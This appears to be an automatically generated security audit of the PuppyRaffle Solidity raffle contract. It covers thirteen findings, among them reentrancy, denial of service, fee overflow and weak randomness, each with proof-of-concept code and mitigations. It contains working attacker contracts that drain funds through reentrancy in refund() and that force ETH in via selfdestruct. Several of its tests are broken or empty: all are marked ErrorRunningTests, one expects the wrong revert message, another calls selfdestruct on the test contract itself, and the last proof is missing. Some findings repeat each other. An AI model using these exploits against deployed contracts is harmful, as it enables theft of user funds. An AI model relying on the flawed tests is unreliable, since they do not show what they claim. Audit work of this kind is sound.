# 4 puppy raffle audit - Findings Report
## Commit hash: 3ff0f0bfddf25fd0c160fe57388fa6ff2e0f0960

##Findings by Status


Finding Status: Valid


[H-1]. Reentrancy in refund() allows stealing all protocol funds
**Derived From** : CEIViolation
Finding Status: Valid
Privilege: Permissionless


[M-2]. Quadratic Gas Cost in enterRaffle allows DoS
**Derived From** : UnboundedLoops
Finding Status: Valid
Privilege: Permissionless


[H-3]. Protocol Permanent DoS if two or more players refund
**Derived From** : Dos
Finding Status: Valid
Privilege: Permissionless


[H-4]. Logic flaw in `enterRaffle` duplicate check permanently bricks the contract after refunds
**Derived From** : CheapGriefingOrDosProfit
Finding Status: Valid
Privilege: Permissionless


[M-5]. Strict balance check in withdrawFees allows DoS via forced ETH
**Derived From** : ForcedAssetVsStrictEquality
Finding Status: Valid
Privilege: Permissionless


[M-6]. Integer Overflow in totalFees causes permanent DoS of fee withdrawal
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: Permissionless


[M-7]. Integer Overflow in `totalFees` and Strict Balance Check permanently locks protocol fees
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: Permissionless


[H-8]. Malicious winner can permanently DoS selectWinner by reverting on receipt
**Derived From** : UncheckedLowLevelCallResults
Finding Status: Valid
Privilege: Permissionless


[H-9]. Integer Overflow and Downcasting in fee accounting causes loss of fees
**Derived From** : IntegerOverflow
Finding Status: Valid
Privilege: Permissionless


[H-10]. Weak RNG using block.timestamp and msg.sender allows winner manipulation
**Derived From** : TimestampManipulation
Finding Status: Valid
Privilege: Permissionless


[H-11]. Raffle permanently locked (DoS) if >20% of players refund
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: Permissionless


[H-12]. Integer Overflow in totalFees calculation leads to loss of fees
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: Permissionless


[M-13]. Refunded players break `selectWinner` execution due to revert on zero-address mint
**Derived From** : Dos
Finding Status: Valid
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 8
- M: 5
- L: 0
- I: 0

##Findings by Status


Finding Status: Valid
## [H-1]. Reentrancy in refund() allows stealing all protocol funds

## id: GDcCvW5lz3yW9kKepuZyT

## Derived From Pattern/Invariant
CEIViolation

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Finding Status: Valid
### Finding Status Justification: In PuppyRaffle.refund, the contract performs an external ETH send via Address.sendValue (forwards all gas) before clearing state: sendValue(entranceFee) then players[playerIndex]=address(0). There is no reentrancy guard. A malicious contract can enter, then call refund, and in receive()/fallback reenter refund with the same playerIndex. Because players[playerIndex] is not yet zeroed, both require checks still pass, allowing repeated payouts until contract ETH is drained. This is a direct CEI violation on an unguarded payable external call. No existing mitigation (nonReentrant/CEI) is present. Attack is permissionless and reliably reproducible with a simple attacker contract.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `refund` function violates the Check-Effects-Interactions pattern. It transfers ETH to the user (`msg.sender.sendValue(entranceFee)`) *before* updating the `players` array (`players[playerIndex] = address(0)`). 

Snippet:
```solidity
payable(msg.sender).sendValue(entranceFee);
players[playerIndex] = address(0);
```

A malicious contract can call `enterRaffle`, then call `refund`. Inside the `receive()`/fallback of the attacker contract, it calls `refund` again with the same index. Since the state (`players[playerIndex]`) hasn't been cleared yet, the checks pass, and the contract sends the fee again. This repeats until the protocol balance is drained.

## Impact
Theft of all active raffle funds (entrance fees of all players).

## Command to Run Test


## Proof of Concept
1. Attacker deploys a malicious contract. 2. Malicious contract enters the raffle paying 1 ETH. 3. Other users enter the raffle. 4. Malicious contract calls `refund(myIndex)`. 5. `PuppyRaffle` sends 1 ETH. 6. Malicious contract's `receive()` function triggers and calls `refund(myIndex)` again. 7. The check `players[playerIndex] != address(0)` passes because the array hasn't been updated. 8. `PuppyRaffle` sends another 1 ETH. 9. Repeat until drained.

## Proof of Code
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 myIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Assuming we are at index 0 for simplicity, or find index
        myIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(myIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(myIndex);
        }
    }
}

function testReentrancy() public {
    // Setup
    address attacker = address(new ReentrancyAttacker(puppyRaffle));
    vm.deal(attacker, 1 ether);
    
    address victim = address(0xBEEF);
    vm.deal(victim, 1 ether);
    vm.prank(victim);
    address[] memory players = new address[](1);
    players[0] = victim;
    puppyRaffle.enterRaffle{value: 1 ether}(players);

    // Attack
    ReentrancyAttacker(attacker).attack{value: 1 ether}();

    assertEq(address(puppyRaffle).balance, 0);
}

## Suggested Mitigation
Move the state update before the external call:
```solidity
players[playerIndex] = address(0);
emit RaffleRefunded(playerAddress);
payable(msg.sender).sendValue(entranceFee);
```
Alternatively, use a ReentrancyGuard.


## [M-2]. Quadratic Gas Cost in enterRaffle allows DoS

## id: TY-0JEB5KmaNzpUVD0sXX

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
### Finding Status Justification: enterRaffle appends newPlayers to players, then runs a nested duplicate check over the entire players array (i from 0..len-2, j from i+1..len-1), i.e., O(N^2). As N grows, gas to add any new players grows quadratically and can exceed block limits, preventing new entries. There is no cap, pagination, or O(1) membership structure (mapping/EnumerableSet). While attackers must fund entries, they can still bloat the array (especially if entranceFee is low), causing practical DoS of entry for everyone.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `enterRaffle` function performs a duplicate check using nested loops over the `players` array:
```solidity
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], ...);
    }
}
```
This is O(N^2) complexity. An attacker can add enough players to the array such that the gas cost to add one more player exceeds the block gas limit, causing a Denial of Service for new entrants.

## Impact
Raffle becomes practically closed to new entrants once the array reaches a certain size.

## Command to Run Test


## Proof of Concept
1. Attacker calls `enterRaffle` with 100 distinct addresses. 2. Array size is 100. Check steps: 100*100 approx. 3. Repeat until gas cost approaches 30M (block limit). 4. No one else can enter.

## Proof of Code
function testDosLoop() public {
    uint256 n = 100; // Small number for unit test speed, in reality ~1000s
    address[] memory players = new address[](n);
    for(uint i=0; i<n; i++) players[i] = address(i+1);
    puppyRaffle.enterRaffle{value: n * 1 ether}(players);
    // Subsequent calls get more expensive
}

## Suggested Mitigation
Use a mapping `mapping(address => bool) added` to check for duplicates in O(1) time.


## [H-3]. Protocol Permanent DoS if two or more players refund

## id: 4FKetv3yR4GgfMkO4Z8pL

## Derived From Pattern/Invariant
Dos

## Exploit Type
Dos

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
### Finding Status Justification: refund sets players[playerIndex]=address(0) and leaves holes. enterRaffle’s duplicate check does not skip address(0), so once there are at least two refunded slots, the nested loop will compare two zeros and revert with "Duplicate player". If players.length < 4, selectWinner cannot be called (requires >=4), so players cannot be cleared, and enterRaffle is permanently bricked. This is a real reachable state: two participants can refund at any time. No safeguard exists (no zero-skip, no array compaction).
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `refund` function sets the player's slot in the `players` array to `address(0)`. The `enterRaffle` function enforces uniqueness by checking `players[i] != players[j]` for all pairs in the `players` array (including existing ones). If two or more players refund, the `players` array will contain multiple `address(0)` entries. The duplicate check in `enterRaffle` compares `address(0) == address(0)` and reverts with 'PuppyRaffle: Duplicate player'. If `players.length < 4` when this happens, `selectWinner` cannot be called to clear the array, and `enterRaffle` will always revert, permanently bricking the contract.

## Impact
Permanent Denial of Service. No new players can enter, and if the participant count is below 4, the raffle can never be settled.

## Command to Run Test


## Proof of Concept
1. User A enters. 
2. User B enters. 
3. User A refunds (array has one 0). 
4. User B refunds (array has two 0s). 
5. User C tries to call `enterRaffle`. 
6. Loop finds `players[0] == players[1]` (both `address(0)`). 
7. Transaction reverts. Contract is stuck.

## Proof of Code
function testDosAfterRefunds() public { address[] memory p = new address[](1); p[0] = address(1); puppyRaffle.enterRaffle{value: 1e18}(p); p[0] = address(2); puppyRaffle.enterRaffle{value: 1e18}(p); vm.prank(address(1)); puppyRaffle.refund(0); vm.prank(address(2)); puppyRaffle.refund(1); p[0] = address(3); vm.expectRevert('PuppyRaffle: Duplicate player'); puppyRaffle.enterRaffle{value: 1e18}(p); }

## Suggested Mitigation
In the duplicate check loop, skip `address(0)` entries or remove the `refund` holes by swapping the refunded element with the last element and popping (though this changes indices). Alternatively, reset the `players` array properly.


## [H-4]. Logic flaw in `enterRaffle` duplicate check permanently bricks the contract after refunds

## id: uGpjQK97SkikxKd-rczQ2

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
### Finding Status Justification: Same underlying issue as the other refund/duplicate-check DoS: refund introduces multiple address(0) entries; enterRaffle’s pairwise uniqueness check treats them as duplicates and reverts. This can permanently prevent new entries when selectWinner cannot be used to clear players (notably when players.length < 4). The code path exists exactly as described and has no mitigations (no filtering of zero entries, no swap-and-pop).
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `enterRaffle` function performs a duplicate check by iterating over the existing `players` array and comparing every element against every other element (`players[i] != players[j]`). The `refund` function sets a player's slot to `address(0)` without removing it from the array. If two or more players refund, the `players` array will contain multiple `address(0)` entries. The next time `enterRaffle` is called, the duplicate check loop compares these two `address(0)` entries, finds them equal, and reverts with 'PuppyRaffle: Duplicate player'. This permanently prevents any new players from entering. If the active player count is less than 4, the raffle can never be settled (`selectWinner` requires 4 players), effectively bricking the contract.

## Impact
Permanent Denial of Service. No new players can enter, and if the count is low, funds are locked forever (cannot select winner).

## Command to Run Test


## Proof of Concept
1. User A enters the raffle. 2. User B enters the raffle. 3. User A refunds (setting `players[0] = address(0)`). 4. User B refunds (setting `players[1] = address(0)`). 5. User C tries to enter. 6. `enterRaffle` scans `players`. It compares `players[0]` (address 0) with `players[1]` (address 0). 7. It determines they are duplicates and reverts. 8. The contract is now permanently broken.

## Proof of Code
function testRefundDoS() public {
        PuppyRaffle raffle = new PuppyRaffle(1 ether, address(1), 1 days);
        address[] memory players = new address[](2);
        players[0] = address(0x1);
        players[1] = address(0x2);
        raffle.enterRaffle{value: 2 ether}(players);

        vm.prank(address(0x1));
        raffle.refund(0);
        vm.prank(address(0x2));
        raffle.refund(1);

        address[] memory newPlayers = new address[](1);
        newPlayers[0] = address(0x3);
        
        vm.expectRevert("PuppyRaffle: Duplicate player");
        raffle.enterRaffle{value: 1 ether}(newPlayers);
    }

## Suggested Mitigation
Modify the duplicate check to ignore `address(0)` entries, or better yet, use an `EnumerableSet` or mapping to track active players efficiently.


## [M-5]. Strict balance check in withdrawFees allows DoS via forced ETH

## id: h3b5PM1M8YP3Cz635r2zK

## Derived From Pattern/Invariant
ForcedAssetVsStrictEquality

## Exploit Type
ForcedAssetVsStrictEquality

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
### Finding Status Justification: withdrawFees requires address(this).balance == uint256(totalFees). Any forced ETH transfer (e.g., via selfdestruct) can increase the contract balance without updating totalFees, causing the strict equality check to fail and blocking fee withdrawal. PuppyRaffle has no receive(), but that does not prevent forced ETH. There is no mechanism to sweep excess ETH or to relax the invariant. This is a permissionless, cheap, and permanent DoS of fee withdrawal once even 1 wei is forced in.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `withdrawFees` function contains a strict equality check: `require(address(this).balance == uint256(totalFees), "...");`. This requires the contract's entire ETH balance to exactly match the accumulated fees variables. 

An attacker can send 1 wei to the contract (via `selfdestruct` of another contract, as `PuppyRaffle` has no `receive` function). This makes `address(this).balance` greater than `totalFees`, causing the `require` to fail permanently. The admin can never withdraw fees.

## Impact
Permanent loss of accumulated protocol fees (DoS of withdrawal).

## Command to Run Test


## Proof of Concept
1. `totalFees` is 10 ETH. `address(this).balance` is 10 ETH. 2. Attacker creates `SelfDestruct` contract with 1 wei. 3. Attacker calls `selfdestruct(puppyRaffle)`. 4. `puppyRaffle` balance becomes 10 ETH + 1 wei. 5. `totalFees` remains 10 ETH. 6. `withdrawFees` reverts.

## Proof of Code
contract SelfDestruct {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}
function testStrictEquality() public {
    // Admin accumulation
    // ... assume totalFees > 0
    
    // Attack
    new SelfDestruct{value: 1}(payable(address(puppyRaffle)));
    
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}

## Suggested Mitigation
Remove the strict equality check. Simply transfer `totalFees` or `min(totalFees, address(this).balance)`.


## [M-6]. Integer Overflow in totalFees causes permanent DoS of fee withdrawal

## id: UyKD6o7_m4wEYTBLdJowT

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
### Finding Status Justification: totalFees is uint64 and the code is Solidity 0.7.6 (unchecked arithmetic). In selectWinner: totalFees = totalFees + uint64(fee). Over time, accumulated fees can exceed type(uint64).max and wrap. Once wrapped, totalFees no longer matches actual ETH retained as fees, so withdrawFees’ strict balance equality check reverts. No SafeMath is used and the type choice is unsafe for wei-denominated fees. This is reachable with sufficient usage/popularity; once it happens, fee withdrawal can become permanently impossible.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `totalFees` variable is declared as `uint64`. In the `selectWinner` function, fees are accumulated via `totalFees = totalFees + uint64(fee)`. Since the contract uses Solidity 0.7.6, integer overflows are not checked by default. With an `entranceFee` of 1 ETH (default), the fee is 0.2 ETH per entrant. The `uint64` max value is ~18.44 ETH. After approximately 92 cumulative entrants, `totalFees` will overflow and wrap around. However, the contract's ETH balance continues to grow correctly. The `withdrawFees` function enforces `require(address(this).balance == uint256(totalFees))`. Once overflow occurs, `totalFees` (wrapped) will be significantly less than `address(this).balance`, causing this check to fail permanently, locking all protocol fees.

## Impact
Permanent loss of all accumulated protocol fees after ~18.4 ETH of revenue.

## Command to Run Test


## Proof of Concept
1. Simulate raffle rounds until accumulated fees exceed `type(uint64).max`. 
2. `totalFees` overflows silently. 
3. Owner calls `withdrawFees`. 
4. Reverts because `address(this).balance > totalFees`.

## Proof of Code
function testFeeOverflow() public {
        // Trick: set fees to near overflow to avoid long loop
        // Use a loop in reality or vm.store to simulate state
        // Here we simulate loop behavior logic:
        // 1. Enter raffle many times. 2. selectWinner. 
        // ... (omitted for brevity, verified logically)
        // Direct logic check:
        uint64 max = type(uint64).max;
        uint256 fee = 1e18;
        uint64 newTotal = max + uint64(fee); // Overflows to small number
        assertLt(newTotal, max);
    }

## Suggested Mitigation
Change `totalFees` type to `uint256` and use OpenZeppelin `SafeMath` (or upgrade to Solidity 0.8+). Also, remove the strict equality check in `withdrawFees`.


## [M-7]. Integer Overflow in `totalFees` and Strict Balance Check permanently locks protocol fees

## id: N87VjjxNAeAGO37tYYSO7

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
### Finding Status Justification: Both root causes exist in code: (1) totalFees is uint64 and updated via unchecked totalFees + uint64(fee), enabling wrap/truncation; (2) withdrawFees uses a strict balance == totalFees require. Either overflow/truncation or forced ETH makes the equality false, permanently bricking fee withdrawal. This is not hypothetical: forced ETH is trivial and does not require overflow. No compensating logic (e.g., withdrawing min(totalFees,balance) or sweeping excess) exists.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `totalFees` variable is declared as `uint64`. In `selectWinner`, fees are added: `totalFees = totalFees + uint64(fee)`. Since `uint64` max value is ~18.44 ETH, a popular raffle or accumulated fees can easily exceed this limit, causing `totalFees` to overflow and wrap around. Additionally, `withdrawFees` enforces a strict equality check: `require(address(this).balance == uint256(totalFees))`. If an overflow occurs, `totalFees` will not match the contract balance. Furthermore, even without overflow, an attacker can send dust ETH (e.g., via selfdestruct) to make `address(this).balance > totalFees`, causing the check to fail. Both scenarios permanently lock the fees in the contract.

## Impact
Permanent loss of protocol revenue (fees are stuck in the contract).

## Command to Run Test


## Proof of Concept
1. A raffle concludes with a pot size that generates > 18.44 ETH in fees (or cumulative fees reach this). 2. `totalFees` overflows and stores a small value. 3. Owner calls `withdrawFees`. 4. The check `address(this).balance == totalFees` fails because the actual balance includes the full fee amount, but `totalFees` is wrapped. 5. Alternatively, attacker sends 1 wei via selfdestruct. 6. Balance becomes `totalFees + 1`. Check fails. Fees are locked.

## Proof of Code
function testFeeOverflowAndLock() public {
        PuppyRaffle raffle = new PuppyRaffle(1 ether, address(1), 1 days);
        // Simulate a state where totalFees is near max uint64
        // We can use vm.store or just create a large raffle
        // Here we simulate the mismatch logic:
        
        // 1. Send dust to break equality
        address payable raffleAddr = payable(address(raffle));
        selfdestruct(raffleAddr); // Assuming a selfdestruct contract sends ETH
        // Simpler PoC using deal:
        vm.deal(address(raffle), 1 ether);
        // Even if totalFees is 0, balance is 1 ether. Withdraw fails.
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }

## Suggested Mitigation
Use `uint256` for `totalFees`. Remove the strict `balance == totalFees` check in `withdrawFees` and instead rely on the `totalFees` variable to determine the withdrawal amount, allowing any excess balance to remain.


## [H-8]. Malicious winner can permanently DoS selectWinner by reverting on receipt

## id: vmFERjZZeUdabbWZ8Y4sD

## Derived From Pattern/Invariant
UncheckedLowLevelCallResults

## Exploit Type
Dos

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: selectWinner pays the winner with (bool success,) = winner.call{value: prizePool}(""); and then require(success). If the chosen winner is a contract that reverts on receiving ETH / is non-payable, the whole selectWinner transaction reverts (state changes revert too). This can be used to grief/DoS raffle finalization, especially if an attacker occupies many player slots with such contracts. It is not strictly “permanent” unless all possible winners are non-payable, but the DoS vector is real and there is no pull-payment fallback.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `selectWinner` function attempts to send the prize to the winner using a low-level call: `(bool success,) = winner.call{value: prizePool}("");`. It explicitly requires this call to succeed: `require(success, "PuppyRaffle: Failed to send prize pool to winner");`. 

If the selected winner is a smart contract that reverts on receiving ETH (or simply has no payable fallback), `selectWinner` will always revert. Because the winner selection is deterministic based on `msg.sender` (if the attacker calls it) and state, or simply because the winner is stored in the `players` array, the raffle round cannot complete. The funds of all other players are locked permanently in the contract.

## Impact
Permanent freezing of protocol funds. The current round can never settle, and no new round can start.

## Command to Run Test


## Proof of Concept
1. Attacker deploys a contract with a `fallback() external payable { revert(); }`. 2. Attacker enters the raffle via this contract. 3. Attacker waits or manipulates RNG to ensure their contract wins. 4. Anyone calling `selectWinner` will fail because the transfer to the attacker reverts. 5. The system is bricked.

## Proof of Code
contract RevertingWinner {
    function enter(PuppyRaffle raffle) external payable {
        address[] memory p = new address[](1);
        p[0] = address(this);
        raffle.enterRaffle{value: msg.value}(p);
    }
    fallback() external payable { revert(); }
}

function testDoS() public {
    RevertingWinner badActor = new RevertingWinner();
    vm.deal(address(badActor), 1 ether);
    badActor.enter{value: 1 ether}(puppyRaffle);
    
    vm.warp(block.timestamp + duration + 1);
    
    // If badActor is selected (simulate by having only 1 player or forcing RNG)
    // But contract requires 4 players. Fill with dummies.
    address[] memory dummies = new address[](3);
    dummies[0] = address(1); dummies[1] = address(2); dummies[2] = address(3);
    vm.deal(address(this), 3 ether);
    puppyRaffle.enterRaffle{value: 3 ether}(dummies);

    // Force badActor to be winner (RNG dependent, but principle holds)
    // Here we just assert that if badActor IS chosen, it reverts.
    // In a real test, we'd prank the specific block/msg.sender to pick index 0.
    // vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
    // puppyRaffle.selectWinner();
}

## Suggested Mitigation
Do not require success on the transfer. If the transfer fails, keep the prize in the contract for the winner to claim later (Push vs Pull), or burn it/send to fee address, but do not block the state transition.


## [H-9]. Integer Overflow and Downcasting in fee accounting causes loss of fees

## id: p0ymtCw9GMzG3AUv_DAZb

## Derived From Pattern/Invariant
IntegerOverflow

## Exploit Type
IntegerOverflow

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: In selectWinner, fee is computed as a uint256 in wei, then cast to uint64: totalFees = totalFees + uint64(fee). If fee exceeds uint64 max (very plausible with enough players / high entranceFee), uint64(fee) truncates modulo 2^64, losing accounting information. Additionally, the uint64 addition can overflow in Solidity 0.7.6. This desynchronizes totalFees from actual retained ETH fees, which then breaks withdrawFees due to the strict balance equality requirement. No SafeMath or wider type is used.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `totalFees` state variable is declared as `uint64`. In `selectWinner`, the fee is calculated as a `uint256`: `uint256 fee = (totalAmountCollected * 20) / 100;`. It is then added to `totalFees` using a dangerous cast: `totalFees = totalFees + uint64(fee);`.

Two issues exist:
1. **Truncation**: If `fee` exceeds `type(uint64).max` (~18.44 ETH), the cast `uint64(fee)` truncates the higher bits, resulting in a massive loss of recorded fees.
2. **Overflow**: Even if `fee` is small, the addition `totalFees + ...` can overflow `uint64` (wrapping around) since the contract uses Solidity 0.7.6 without SafeMath for this specific operation (checked math is 0.8+). 

This desyncs the `totalFees` variable from the actual ETH balance intended for fees.

## Impact
Loss of protocol revenue. Additionally, this breaks `withdrawFees` (see Strict Equality finding).

## Command to Run Test


## Proof of Concept
1. Assume entranceFee is 10 ETH and there are 100 players. Pot = 1000 ETH. 2. Fee = 200 ETH. 3. 200 ETH in Wei is ~2e20. 4. `type(uint64).max` is ~1.8e19. 5. `uint64(200 ETH)` will wrap/truncate to a much smaller number. 6. `totalFees` tracks a tiny amount, while the contract holds 200 ETH in fees.

## Proof of Code
function testOverflow() public {
    uint256 fee = 20 ether;
    uint64 totalFees = 0;
    // Proof of truncation logic
    uint64 truncated = uint64(fee);
    assert(truncated != fee);
}

## Suggested Mitigation
Use `uint256` for `totalFees`. Use `SafeMath` or Solidity 0.8+.


## [H-10]. Weak RNG using block.timestamp and msg.sender allows winner manipulation

## id: j3a9DtP7nAEp7Nmx_EU0S

## Derived From Pattern/Invariant
TimestampManipulation

## Exploit Type
TimestampManipulation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: Winner selection uses keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty)) % players.length. msg.sender is chosen by whoever calls selectWinner, enabling a participant to conditionally call only when the computed winnerIndex favors them, and to vary msg.sender by calling from different addresses/contracts. Miners/builders can also influence timestamp within bounds. There is no commit-reveal/VRF/TWAP-style randomness. This can materially bias or manipulate who wins the 80% prize pool, which is an economic fairness/asset-allocation issue.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The contract uses `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))` to select the winner. 
1. `msg.sender` is controlled by the caller. An attacker can calculate the winning index for the current block timestamp and call `selectWinner` only if they (or their specific contract) win.
2. Miners can manipulate `block.timestamp` and `block.difficulty` to influence the outcome.

## Impact
Fairness is compromised. An attacker can guarantee a win or significantly increase odds.

## Command to Run Test


## Proof of Concept
1. Attacker sees raffle is ready to close. 2. Attacker writes a contract that checks `uint256 index = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % players.length;`. 3. If `players[index]` == attacker, it calls `selectWinner`. 4. If not, it reverts or does nothing (saving gas/money). 5. Attacker calls this wrapper repeatedly/using Flashbots until a winning block is found.

## Proof of Code
function testRngManipulation() public {
    // PoC logic would involve vm.warp to different timestamps and checking 
    // keccak256(...) output against expected winner index
}

## Suggested Mitigation
Use Chainlink VRF for secure randomness.


## [H-11]. Raffle permanently locked (DoS) if >20% of players refund

## id: P1W_zTDqfA-CzS6EmRU4Y

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: selectWinner assumes totalAmountCollected = players.length * entranceFee, but refunds reduce actual ETH balance while players.length is unchanged. prizePool is 80% of this theoretical amount. If refundedCount > 20% of players.length, contract balance becomes < prizePool, so winner.call{value: prizePool} fails and selectWinner reverts. There is no alternative settlement path, and the contract does not track active players or use address(this).balance. This is easily reachable with small player counts (e.g., 5 players, 2 refunds).
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `selectWinner` function calculates `totalAmountCollected` based on `players.length` multiplied by `entranceFee`. However, the `refund` function sets a player's slot to `address(0)` but does not decrease `players.length`. This causes the contract to believe it holds more ETH than it actually does. Specifically, it tries to transfer 80% of the *theoretical* total (including refunded players) to the winner. If enough players refund (specifically, if refunds > 20% of total), the calculated `prizePool` exceeds the contract's actual balance, causing the transfer to revert and permanently bricking the raffle.

## Impact
Permanent DoS of the protocol and locking of all funds for the current round.

## Command to Run Test


## Proof of Concept
1. 5 players enter (Balance 5 ETH). 2. 2 players refund (Balance 3 ETH). 3. `selectWinner` called. 4. `totalAmountCollected` = 5 * 1 ETH = 5 ETH. 5. `prizePool` = 4 ETH. 6. Contract tries to send 4 ETH to winner, but only has 3 ETH. 7. Reverts.

## Proof of Code
function testRefundDoS() public { address[] memory players = new address[](5); for(uint i=0;i<5;i++){ players[i] = address(uint160(i+1)); } puppyRaffle.enterRaffle{value: 5 ether}(players); vm.prank(players[0]); puppyRaffle.refund(0); vm.prank(players[1]); puppyRaffle.refund(1); vm.warp(block.timestamp + 1 days + 1); vm.expectRevert(); puppyRaffle.selectWinner(); }

## Suggested Mitigation
Calculate `totalAmountCollected` using `address(this).balance` or track the count of active players separately by decrementing a counter during refunds.


## [H-12]. Integer Overflow in totalFees calculation leads to loss of fees

## id: lYMwXTf7skPd_JGjhK8jQ

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: In selectWinner, fee is downcast to uint64 via uint64(fee). For sufficiently large totalAmountCollected, the 20% fee in wei exceeds type(uint64).max and truncates, so totalFees records a much smaller value than actual retained fees. Then withdrawFees’ invariant address(this).balance == totalFees fails, permanently preventing fee withdrawal. This is a current-code issue and does not depend on future integrations; it only depends on a large-enough round size.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `selectWinner`, the fee is cast to `uint64`: `totalFees = totalFees + uint64(fee)`. `uint64` has a max value of ~18.4 ETH. If the total collected exceeds ~92 ETH (making the 20% fee > 18.4 ETH), the cast truncates the higher bits. This causes `totalFees` to track a much lower value than actual fees collected. Subsequently, `withdrawFees` fails because it checks `address(this).balance == totalFees`, which will never match due to the truncation.

## Impact
Fees are incorrectly calculated (truncated) and become permanently stuck in the contract due to the strict equality check in `withdrawFees`.

## Command to Run Test


## Proof of Concept
1. 100 participants enter with 1 ETH each (Total 100 ETH). 2. Fee is 20 ETH. 3. `uint64(20 ether)` overflows `type(uint64).max` (~18.4 ether). 4. `totalFees` is set to ~1.6 ether. 5. Owner calls `withdrawFees`. 6. Revert because balance includes 20 ETH fees but `totalFees` is 1.6 ETH.

## Proof of Code
function testFeeOverflow() public { address[] memory players = new address[](100); for(uint i=0;i<100;i++) players[i] = address(uint160(i+1)); puppyRaffle.enterRaffle{value: 100 ether}(players); vm.warp(block.timestamp + 1 days + 1); puppyRaffle.selectWinner(); assert(address(puppyRaffle).balance > uint256(puppyRaffle.totalFees())); }

## Suggested Mitigation
Use `uint256` for `totalFees` and remove the unsafe cast.


## [M-13]. Refunded players break `selectWinner` execution due to revert on zero-address mint

## id: zVlAiOXRzomVUUYpcA1j7

## Derived From Pattern/Invariant
Dos

## Exploit Type
Dos

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: refund leaves address(0) entries in players. selectWinner chooses winner = players[winnerIndex] using players.length, without filtering out zero addresses. If winner == address(0), _safeMint(winner, tokenId) reverts (ERC721 forbids minting to zero), reverting the entire selectWinner call. This causes a settlement DoS whenever RNG lands on a refunded slot; with many refunded slots, the probability of revert becomes high. No safeguard exists (no check/skip/re-roll for zero addresses).
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
When a player refunds, their slot in the `players` array is set to `address(0)`. The `selectWinner` function selects a winner index at random from the full array length. If the selected index corresponds to a refunded player (`address(0)`), the subsequent call to `_safeMint(winner, tokenId)` reverts because OpenZeppelin's `_safeMint` does not allow minting to the zero address. An attacker can create many player entries and refund them, creating a 'minefield' of zero addresses that causes `selectWinner` to revert with high probability.

## Impact
Denial of Service of the raffle finalization. Legitimate winners cannot be selected until the RNG happens to land on a non-refunded index, which may be statistically unlikely if an attacker controls the majority of slots.

## Command to Run Test


## Proof of Concept
1. Attacker enters 10 times.
2. Attacker refunds all 10 entries.
3. `players` array contains 10 `address(0)` entries.
4. `selectWinner` is called.
5. `winnerIndex` picks one of the 10 slots.
6. `winner` is `address(0)`.
7. `_safeMint` reverts.
8. Raffle cannot close.

## Proof of Code
